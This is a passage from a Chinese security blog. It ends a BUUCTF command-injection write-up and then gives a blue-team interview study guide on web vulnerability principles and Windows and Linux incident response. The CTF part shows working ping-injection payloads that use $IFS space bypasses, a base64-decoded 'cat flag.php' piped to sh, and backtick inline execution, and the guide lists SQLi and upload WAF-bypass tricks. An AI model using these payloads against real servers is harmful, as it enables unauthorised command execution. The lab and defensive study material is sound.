<h2 id="第十题-命令执行漏洞"><a href="#第十题-命令执行漏洞" class="headerlink" title="第十题 命令执行漏洞"></a>第十题 命令执行漏洞</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115154242420.png" alt="image-20220115154242420"></p>
<p>又是ping命令</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115154306587.png" alt="image-20220115154306587"></p>
<p>发现flag</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115154348761.png" alt="image-20220115154348761"></p>
<p>但是发现/和空格都被过滤了，想办法绕过</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115154446178.png" alt="image-20220115154446178"></p>
<p>额flag也被绕过了</p>
<p>代替空格的符号有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%20(space)、%09(tab)、$IFS$9、$&#123;IFS&#125;$9、 &#123;IFS&#125;、IFS 都可以</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115154651400.png" alt="image-20220115154651400"></p>
<p>访问index看看过滤规则,用的是正则表达式。</p>
<p>我们可以用变量来代替flag字段，/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115155138771.png" alt="image-20220115155138771"></p>
<p>得到flag</p>
<p>在网上还发现了其他的方法：</p>
<p>  1.通过执行sh命令来执行 （bash被过滤了，不然也可以执行）</p>
<pre><code>/ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
注：sh是linux中运行shell的命令，bash相当于sh的升级版，sh∈bash





2.内联执行 （真正的大佬操作，给跪了）
构造 /?ip=127.0.0.1;cat$IFS$9`ls`
注：内联，就是将反引号内命令的输出作为输入执行。
</code></pre>
<h2 id="第十一题-菜刀"><a href="#第十一题-菜刀" class="headerlink" title="第十一题 菜刀"></a>第十一题 菜刀</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115160821181.png" alt="image-20220115160821181"></p>
<p>蚁剑直接连</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115160834862.png" alt="image-20220115160834862"></p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>2022初级蓝队面试</title>
    <url>/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<h1 id="2022初级蓝队面试"><a href="#2022初级蓝队面试" class="headerlink" title="2022初级蓝队面试"></a>2022初级蓝队面试</h1><p>不是什么大佬，溯源不太会就给个思路</p>
<p>这里就准备一下我的复习资料吧</p>
<p>大概会分为几个模块进行复习 漏洞原理  应急响应  常见应急响应案例   溯源  前沿漏洞  中间件漏洞以及常见端口等杂项问题</p>
<p>以及一个开局话术</p>
<h1 id="开局话术"><a href="#开局话术" class="headerlink" title="开局话术"></a>开局话术</h1><p>面试官好，我是（叫）xxx ，目前在四川成都，然后目前我们学校已经结课了，我这边<br>确定有时间参加护网，我是从去年开始接触网安或者说 学渗透的，<br>前期主要在 b 站看一些培训视频，，比如小迪的那个渗透培训，后面<br>也报过一些，里面讲到了一些厂<br>商的安全产品和护网行动的内容，包括自己也加了相关的护网交流群，<br>所以自己对护网的一些具体岗位职责，都还是了解比较充分的；也了解<br>一些安全产品（深信服/绿盟态势感知，问就说，不问不说）的使用，<br>所以自己感觉在这次护网中可以承担蓝队初级一些内容；<br>平时的实战经历大多来自src的挖掘，漏洞盒子私密项目，补天专属补天私密，<br>以及各种企业src，类似字节跳动，ucloud，小米魅族等等都提交过有效漏洞<br>挖最多的基本上是xss，csrf和逻辑漏洞，出过几个逻辑漏洞的高危<br>差不多就这些</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="owasp"><a href="#owasp" class="headerlink" title="owasp"></a>owasp</h2><p>注入、失效身份验证和会话管理、敏感信息泄露、XML外部实体注入攻击（XXE）、<br>存取控制中断（差不多就是未授权访问）、安全性错误配置、跨站脚本攻击（XSS）、不安全的反序列化、<br>使用具有已知漏洞的组件、日志记录和监控不足。</p>
<h2 id="sql："><a href="#sql：" class="headerlink" title="sql："></a>sql：</h2><p>SQL注入-(SQL Injection)是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的”数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱库<br>被删除、甚至整个服务器权限陷)。<br>常见注入手法： 联合查询（union） 报错注入 布尔盲注 时间注入  宽字节注入 堆叠查询  二阶注入</p>
<p>注入分类：</p>
<p>按注入点：数字，字符，搜索</p>
<p>按数据提交方式：get,post,cookie,http</p>
<p>按执行效果：布尔，时间，报错，联合，堆叠，宽字节</p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172850329.png" alt="image-20220616172850329"></p>
<h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">预编译法；</span><br><span class="line">避免从前端传不必要的值；</span><br><span class="line">对传入的参数进行过滤。</span><br></pre></td></tr></table></figure>

<h3 id="sql绕过"><a href="#sql绕过" class="headerlink" title="sql绕过"></a>sql绕过</h3><p>大小写混合，url编码，注释，参数污染，特殊符号绕过比如科学技术法，垃圾数据溢出</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符型注入 输入：id=1</span><br><span class="line">MySQL执行的语句为：select* from&lt;表名&gt; where id=&#x27;1&#x27;</span><br><span class="line">若输入：id=1&#x27; and 1=1#</span><br><span class="line">MySQL执行的语句为：select* from&lt;表名&gt; where id=&#x27;1\&#x27; and 1=1#&#x27;</span><br><span class="line">这样单引号就失去了作用，无法实现闭合</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在地址后先加一个%df，再加单引号，GBK编码中反斜杠的编码为%5c，而%df%5c表示繁体字“連”，所以这时单引号成功逃逸，例如：</span><br><span class="line"></span><br><span class="line">访问1%df&#x27;#，首先进行转义并编码，为：1%df%5c%27%23,即：1連&#x27;#</span><br><span class="line">代入数据库查询语句为：select* from&lt;表名&gt; where id=&#x27;1連&#x27;</span><br><span class="line">配合后面的union查询就可获得我们想要的查询结果。</span><br></pre></td></tr></table></figure>

<h3 id="二次注入的原理"><a href="#二次注入的原理" class="headerlink" title="二次注入的原理"></a>二次注入的原理</h3><p>二次注入原理，主要分为两步<br><strong>第一步</strong>：插入恶意数据<br><strong>第二步</strong>：引用恶意数据<br><strong>第一步</strong>：输入参数1’，函数经过转义函数变成’，参数进入数据库存储还原为1’<br><strong>第二步</strong>：将1’从数据库中取出 取出后直接给变量带入SQL ，SQL注入触发</p>
<h3 id="堆叠注入的原理"><a href="#堆叠注入的原理" class="headerlink" title="堆叠注入的原理"></a>堆叠注入的原理</h3><p>mysql数据库<a href="https://so.csdn.net/so/search?q=sql%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">sql语句</a>的默认结束符是以<code>;</code>结尾，在执行多条SQL语句时就要使用结束符隔开，那么在<code>;</code>结束一条sql语句后继续构造下一条语句，就会一起执行</p>
<h3 id="updataxml报错原理"><a href="#updataxml报错原理" class="headerlink" title="updataxml报错原理"></a>updataxml报错原理</h3><p>updatexml(xml_doument,XPath_string,new_value)<br>第一个参数：XML的内容<br>第二个参数：是需要update的位置XPATH路径<br>第三个参数：是更新后的内容</p>
<p>所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式</p>
<h3 id="sql注入常见的函数"><a href="#sql注入常见的函数" class="headerlink" title="sql注入常见的函数"></a>sql注入常见的函数</h3><p><a href="https://blog.csdn.net/weixin_45744814/article/details/120436723">(83条消息) sql注入常见函数（附图详解）_君莫hacker的博客-CSDN博客_sql注入函数</a></p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606160636312.png" alt="image-20220606160636312"></p>
<h2 id="xss："><a href="#xss：" class="headerlink" title="xss："></a>xss：</h2><p>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br>形成XSS漏洞的主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。</p>
<p>反射型 存储型 dom型</p>
<p>DOM型xss给予文档对象模型的一种漏洞。DOM是一个与平,编程语言无关的接口,它允许程序或脚本动态访问和更新文档内容,结构和样式,处理后的结果能够成为显示页面的一部分。</p>
<p>一些xss绕过<br>利用ie双反引号闭合左边双引号的特写<br>大小写<br>双写，编码，双斜杠加十六进这</p>
<h2 id="csrf漏洞："><a href="#csrf漏洞：" class="headerlink" title="csrf漏洞："></a>csrf漏洞：</h2><p>构造恶意网址借用用户cookie进行操作</p>
<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。<br>绕过思路<br>图片马  mime  %00 0x00  扩展名  .htccess文件绕过   解析漏洞  条件竞争</p>
<p>绕waf</p>
<p>字符变异（大小写，多个分号），顺序颠倒（交换name和filename的值），数据重复（filename重复），数据你出（name与filename之间插入垃圾数据，bundary字符串中加入垃圾数据），数据截断（00截断，引号截断）</p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172901546.png" alt="image-20220616172901546"></p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616161354087.png" alt="image-20220616161354087"></p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>利用URL去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。</p>
<p>include() require()</p>
<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>system、eval和exec等函数，是该漏洞攻击成功的主要原因。</p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172913149.png" alt="image-20220616172913149"></p>
<h2 id="反序列化漏洞（一会补充"><a href="#反序列化漏洞（一会补充" class="headerlink" title="反序列化漏洞（一会补充"></a>反序列化漏洞（一会补充</h2><p>一、serialize()<br>二、unserialize()</p>
<h2 id="ssrf以及常见的利用协议"><a href="#ssrf以及常见的利用协议" class="headerlink" title="ssrf以及常见的利用协议"></a>ssrf以及常见的利用协议</h2><p>常见协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file http dict  gopher   常见利用就是ssrf加上redis未授权</span><br></pre></td></tr></table></figure>



<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>收集信息：收集客户信息和中毒主机信息，包括样本<br>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等<br>抑制范围：隔离使受害⾯不继续扩⼤<br>深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源<br>清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产<br>产出报告：整理并输出完整的安全事件报告</p>
<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>常见的应急响应事件分类：Web 入侵：网页挂马、主页篡改、Webshell</p>
<p>系统入侵：病毒木马、勒索软件、远控后门</p>
<p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p>
<h3 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h3><h4 id="1-1检查系统账号安全（日志-注册表"><a href="#1-1检查系统账号安全（日志-注册表" class="headerlink" title="1.1检查系统账号安全（日志,注册表"></a>1.1检查系统账号安全（日志,注册表</h4><p>查看服务器是否有弱口令，远程管理端口是否对公网开放（根据情况问服务器管理员</p>
<p>查看服务器是否存在可疑账号，新增账号（下面说怎么查看）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开cmd</span><br><span class="line">输入lusrmagr.msc命令</span><br><span class="line">如果有管理员群组administrators里面的新增账号，给他删掉</span><br></pre></td></tr></table></figure>



<p>查看服务器是否存在隐藏账号，克隆账号</p>
<p><a href="https://blog.csdn.net/CC210231/article/details/124082764">(83条消息) Windows隐藏账户_MountainTop_cc的博客-CSDN博客_windows 查看隐藏账户</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检查方法：</span><br><span class="line">打开注册表，查看管理员对应的键值  打开注册表 regedit（cmd命令</span><br><span class="line">使用D盾查杀</span><br></pre></td></tr></table></figure>



<p>结合日志，查看管理员登录时间，用户名是否存在异常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Win+R  输入eventvwr.msc  打开事件查看器</span><br><span class="line">导出Windows日志--安全  利用微软官方工具log parser进行分析</span><br></pre></td></tr></table></figure>

<h4 id="1-2检查异常端口，进程"><a href="#1-2检查异常端口，进程" class="headerlink" title="1.2检查异常端口，进程"></a>1.2检查异常端口，进程</h4><p>检查端口连接情况，是否有远程连接，可疑连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用netstat -ano 命令查看目前的网络连接，定位可疑的ESTABLISHED</span><br><span class="line">根据netstat命令定位出的PID编号 在通过taskist命令进行进程定位</span><br></pre></td></tr></table></figure>



<p>进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开始--运行--输入 msinfo32命令，一次点击“软件环境--正在运行任务”就可以查看到进程的详细信息，比如说进程的路径，进程的id，文件创建日以及启动时间</span><br><span class="line">使用D盾_web查杀工具</span><br><span class="line">或者说用微软官方的porcess explorer进行排查</span><br><span class="line">火绒</span><br><span class="line">查看可疑的进程以及子进程</span><br><span class="line">   没有签名验证信息的进程</span><br><span class="line">   进程的属主</span><br><span class="line">   进程的路径是否合法</span><br><span class="line">   cpu或内存资源占用长时间过高的进程</span><br></pre></td></tr></table></figure>



<p>小技巧</p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606180504575.png" alt="image-20220606180504575"></p>
<h3 id="权限维持排查"><a href="#权限维持排查" class="headerlink" title="权限维持排查"></a>权限维持排查</h3><h4 id="2-1检查服务器是否有异常的启动项"><a href="#2-1检查服务器是否有异常的启动项" class="headerlink" title="2.1检查服务器是否有异常的启动项"></a>2.1检查服务器是否有异常的启动项</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a：登录服务器</span><br><span class="line">系统启动文件夹c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br><span class="line">资源管理器打开“系统启动文件夹”的命令，shell:Common Startup</span><br><span class="line">用户启动文件夹：c:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">资源管理器打开“用户启动文件夹”的命令，shell:startup</span><br><span class="line"></span><br><span class="line">b:点击开始菜单》【运行】，输入msconfig,查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</span><br><span class="line"></span><br><span class="line">c:单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常</span><br><span class="line">三个注册表项：</span><br><span class="line">• HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">d:利用安全软件查看启动项，开机时间管理</span><br></pre></td></tr></table></figure>

<h4 id="2-2检查计划任务"><a href="#2-2检查计划任务" class="headerlink" title="2.2检查计划任务"></a>2.2检查计划任务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:单机【开始】》设置》控制面板》任务计划》查看计划任务属性，便可以发现木马文件的路径</span><br><span class="line">b:cmd》输入at命令，检查计算机与网络上的其他计算机之间的绘画或计划任务，如有，则确认是否为正常连接。（或者 schtasks.exe</span><br></pre></td></tr></table></figure>

<h4 id="2-3检查服务自启动项"><a href="#2-3检查服务自启动项" class="headerlink" title="2.3检查服务自启动项"></a>2.3检查服务自启动项</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开始》运行》输入services.msc，注意服务状态和启动类型，检查是否有异常服务</span><br></pre></td></tr></table></figure>

<h3 id="查看系统相关信息"><a href="#查看系统相关信息" class="headerlink" title="查看系统相关信息"></a>查看系统相关信息</h3><p>查看系统补丁</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开始》运行》systeminfo</span><br></pre></td></tr></table></figure>



<p>查找可疑目录及文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看用户目录 C:\Users\</span><br><span class="line">开始》运行，输入`%UerProfile%\Rcent`，分析最近打开可疑文件</span><br><span class="line">回收站，浏览器下载目录，浏览器历史记录</span><br><span class="line">修改时间在创建时间之前的的可疑文件</span><br></pre></td></tr></table></figure>



<p>找出统一时间范围内创建的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</span><br><span class="line">  a:利用 [Registry Workshop](http://www.torchsoft.com/en/rw_information.html) 注册表编辑器的搜索功</span><br><span class="line">能，可以找到最后写入时间区间的文件。</span><br><span class="line">  b:利用计算机自带文件搜索功能，指定修改时间进行搜索</span><br></pre></td></tr></table></figure>

<h3 id="自动化查杀"><a href="#自动化查杀" class="headerlink" title="自动化查杀"></a>自动化查杀</h3><p>病毒查杀：下载安全软件，更新最新病毒库，进行全盘扫描</p>
<p>webshell查杀</p>
<p>检查刚发：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规则库的不足</p>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><h4 id="1-系统日志"><a href="#1-系统日志" class="headerlink" title="1.系统日志"></a>1.系统日志</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:前提：开启审核策略，若日后系统出现故障，安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息</span><br><span class="line">b:Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”</span><br><span class="line">c:到处应用程序日志，安全日志，系统日志，利用[log parser]进行分析</span><br><span class="line">下载地址：https://www.microsoft.com/en- us/download/details.aspx?id=24659</span><br></pre></td></tr></table></figure>

<h4 id="2-Web访问日志"><a href="#2-Web访问日志" class="headerlink" title="2.Web访问日志"></a>2.Web访问日志</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:找到中间件的web日志，打包到本地方便进行分析</span><br><span class="line">b:推荐工具 windows:用EmEditor进行日志分析，支持大文本，搜索效率还不错</span><br><span class="line">linux下，使用shell命令组合查询分析</span><br></pre></td></tr></table></figure>

<h4 id="3-应用程序日志"><a href="#3-应用程序日志" class="headerlink" title="3.应用程序日志"></a>3.应用程序日志</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">应用程序日志，包含由应用程序或系统程序记录的事件，主要记录程序运行方</span><br><span class="line">面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人</span><br><span class="line">员可以自行决定监视哪些事件。默认位置：</span><br><span class="line">%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure>

<h4 id="4-Windows事件ID说明"><a href="#4-Windows事件ID说明" class="headerlink" title="4.Windows事件ID说明"></a>4.Windows事件ID说明</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 4624 登录成功</span><br><span class="line">• 4625 登录失败</span><br><span class="line">• 4634 注销成功</span><br><span class="line">• 4647 用户启动的注销</span><br><span class="line">• 4672 使用超级用户（如管理员）进行登录</span><br><span class="line">• 4720 创建用户</span><br></pre></td></tr></table></figure>

<h4 id="5-工具的使用-log-parser"><a href="#5-工具的使用-log-parser" class="headerlink" title="5.工具的使用 log parser"></a>5.工具的使用 log parser</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 基本查询结构</span><br><span class="line">• Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\xx.evtx&quot; • 使用Log Parser分析日志</span><br><span class="line">• 登录成功的所有事件</span><br><span class="line">• LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line">• 指定登录时间范围的事件：</span><br><span class="line">• LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\Security.evtx where</span><br><span class="line">TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and</span><br><span class="line">EventID=4624&quot;</span><br><span class="line">• 提取登录成功的用户名和IP：</span><br><span class="line">• LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as</span><br><span class="line">EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as</span><br><span class="line">Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where</span><br><span class="line">EventID=4624&quot;</span><br><span class="line">• 登录失败的所有事件：</span><br><span class="line">• LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\Security.evtx where</span><br><span class="line">EventID=4625&quot;</span><br><span class="line">• 提取登录失败用户名进行聚合统计：</span><br><span class="line">• LogParser.exe -i:EVT &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as</span><br><span class="line">EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as</span><br><span class="line">user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as</span><br><span class="line">Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where</span><br><span class="line">EventID=4625 GROUP BY Message&quot;</span><br><span class="line">• 系统历史开关机记录：</span><br><span class="line">• LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT TimeGenerated,EventID,Message</span><br><span class="line">FROM c:\System.evtx where EventID=6005 or EventID=6006&quot;</span><br></pre></td></tr></table></figure>



<h3 id="病毒分析工具"><a href="#病毒分析工具" class="headerlink" title="病毒分析工具"></a>病毒分析工具</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• PCHunter：http://www.xuetr.com</span><br><span class="line">• 火绒剑：https://www.huorong.cn</span><br><span class="line">• Process Explorer：https://docs.microsoft.com/zhcn/sysinternals/downloads/process-explorer</span><br><span class="line">• processhacker：https://processhacker.sourceforge.io/downloads.php</span><br><span class="line">• autoruns：</span><br><span class="line">https://docs.microsoft.com/enus/sysinternals/downloads/autoruns</span><br><span class="line">• OTL：https://www.bleepingcomputer.com/download/otl/</span><br><span class="line">• SysInspector：</span><br><span class="line">http://download.eset.com.cn/download/detail/?product=sysinspector</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 卡巴斯基：http://devbuilds.kasperskylabs.com/devbuilds/KVRT/latest/full/KVRT.exe （推荐理由：绿色</span><br><span class="line">版、最新病毒库）</span><br><span class="line">• 大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：</span><br><span class="line">扫描快、一次下载只能用1周，更新病毒库）</span><br><span class="line">• 火绒安全软件：https://www.huorong.cn</span><br><span class="line">• 360杀毒：http://sd.360.cn/download_center.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="病毒动态"><a href="#病毒动态" class="headerlink" title="病毒动态"></a>病毒动态</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn</span><br><span class="line">• 微步在线威胁情报社区：https://x.threatbook.cn</span><br><span class="line">• 火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html</span><br><span class="line">• 爱毒霸社区：http://bbs.duba.net</span><br><span class="line">• 腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html</span><br></pre></td></tr></table></figure>

<h4 id="在线病毒扫描网站"><a href="#在线病毒扫描网站" class="headerlink" title="在线病毒扫描网站"></a>在线病毒扫描网站</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• D盾_Web查杀：http://www.d99net.net/index.asp</span><br><span class="line">• 河马 WebShell 查杀：http://www.shellpub.co</span><br></pre></td></tr></table></figure>

<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="入侵排查思路"><a href="#入侵排查思路" class="headerlink" title="入侵排查思路"></a>入侵排查思路</h3><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204100713.png" alt="image-20220615204100713"></p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616003137358.png" alt="image-20220616003137358"></p>
<h4 id="1-1账号安全"><a href="#1-1账号安全" class="headerlink" title="1.1账号安全"></a>1.1账号安全</h4><p>基本使用：</p>
<p>1.用户信息文件/etc/passwd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• root:x:0:0:root:/root:/bin/bash</span><br><span class="line">• account:password:UID:GID:GECOS:directory:shell • 用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell • 注意：无密码只允许本机登陆，远程不允许登陆</span><br></pre></td></tr></table></figure>

<p>2.影子文件/etc/shadow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">•root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt. Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">• 用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure>

<p>3.和账号有关的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• who 查看当前登录用户（tty 本地登陆 pts 远程登录）</span><br><span class="line">• w 查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">• uptime 查看登陆多久、多少用户，负载状态</span><br></pre></td></tr></table></figure>

<p>4.账号的一些其他命令</p>
